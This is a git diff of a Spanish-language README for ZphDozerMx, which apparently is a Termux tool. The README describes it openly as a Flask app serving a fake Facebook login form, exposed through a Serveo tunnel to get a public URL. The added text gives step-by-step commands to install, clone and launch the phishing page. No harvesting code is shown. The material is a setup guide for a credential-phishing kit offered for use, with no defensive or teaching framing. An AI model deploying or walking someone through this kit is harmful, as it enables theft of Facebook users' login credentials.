@@ -1,22 +1,65 @@
-# Facebook Login Clone
+# ZphDozerMx
 
-Este es un clon de la página de inicio de sesión de Facebook construido usando Flask y diseñado para ser ejecutado en Termux.
+ZphDozerMx es un proyecto Flask que sirve un formulario de inicio de sesión falso de Facebook. Este proyecto se ejecuta en Termux y utiliza Serveo para generar una URL pública.
 
-## Requisitos
+## Instalación
 
-Antes de instalar el proyecto, asegúrate de tener instaladas las siguientes herramientas en Termux:
+Sigue los pasos a continuación para instalar y configurar ZphDozerMx en Termux.
 
-1. **Python**: Necesario para ejecutar scripts de Python.
-2. **pip**: El gestor de paquetes de Python para instalar dependencias.
-3. **Git**: Para clonar el repositorio desde GitHub.
-4. **OpenSSH**: Para usar Serveo y exponer el servidor a través de un túnel SSH.
+### Requisitos
 
-### Instalación de dependencias en Termux
+Asegúrate de tener Termux instalado en tu dispositivo Android.
 
-Puedes instalar las dependencias necesarias con los siguientes comandos:
+### Pasos de instalación
 
-```bash
-pkg update
-pkg upgrade
-pkg install python git openssh
-pip install --upgrade pip
+1. Aquí tienes los comandos de instalación en formato de lista para que los puedas seguir fácilmente:
+
+1. **Actualizar paquetes y herramientas de Termux**:
+
+   ```bash
+   pkg update -y && pkg upgrade -y
+   ```
+
+2. **Instalar Git**:
+
+   ```bash
+   pkg install git -y
+   ```
+
+3. **Instalar Python**:
+
+   ```bash
+   pkg install python -y
+   ```
+
+4. **Instalar OpenSSH** (para utilizar Serveo):
+
+   ```bash
+   pkg install openssh -y
+   ```
+
+5. **Clonar el repositorio desde GitHub**:
+
+   ```bash
+   git clone https://github.com/3meses/ZphDozerMx.git
+   ```
+
+6. **Cambiar al directorio del proyecto**:
+
+   ```bash
+   cd ZphDozerMx
+   ```
+
+7. **Instalar las dependencias de Python**:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+8. **Ejecutar el script**:
+
+   ```bash
+   python app.py
+   ```
+
+9. **Seleccionar la opción 1 en la terminal** para elegir el login de Facebook.
